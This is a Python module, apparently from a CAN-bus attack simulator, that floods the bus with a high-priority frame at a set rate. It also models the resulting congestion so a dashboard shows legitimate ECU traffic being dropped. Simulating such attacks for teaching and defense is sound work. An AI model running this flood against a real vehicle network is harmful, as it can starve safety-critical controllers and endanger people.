"""
Flood / DoS attack: hammer the bus with a high-priority (low arbitration ID)
frame as fast as possible. On a real CAN bus this wins arbitration against
almost everything else and starves legitimate ECUs -- that's modeled here
via `bus.congestion`, which the dashboard's decode step uses to drop
legitimate frames while the flood is active, so the effect is visible live.
"""

import time


def run_flood(attack, bus) -> None:
    arb_id = int(attack.params.get("arb_id", 0x000))
    rate_hz = max(1, int(attack.params.get("rate_hz", 500)))
    duration = attack.params.get("duration")  # seconds, None = until stopped
    payload = bytes(attack.params.get("payload", [0xFF] * 8))

    interval = 1.0 / rate_hz
    # Saturate congestion quickly, cap below 1.0 so a trickle of legit
    # traffic can still get through (matches real-world partial bus-off).
    bus.congestion = min(0.95, rate_hz / 1000)

    attack.log(f"flooding 0x{arb_id:03X} @ {rate_hz}Hz -- bus congestion {bus.congestion:.0%}")

    start = time.time()
    try:
        while not attack.stop_event.is_set():
            if duration and (time.time() - start) > float(duration):
                break
            bus.send(arb_id, payload)
            attack.note_frame(arb_id, payload)
            attack.stop_event.wait(interval)
    finally:
        bus.congestion = 0.0
        attack.log(f"flood stopped after {attack.frames_sent} frames, bus congestion cleared")
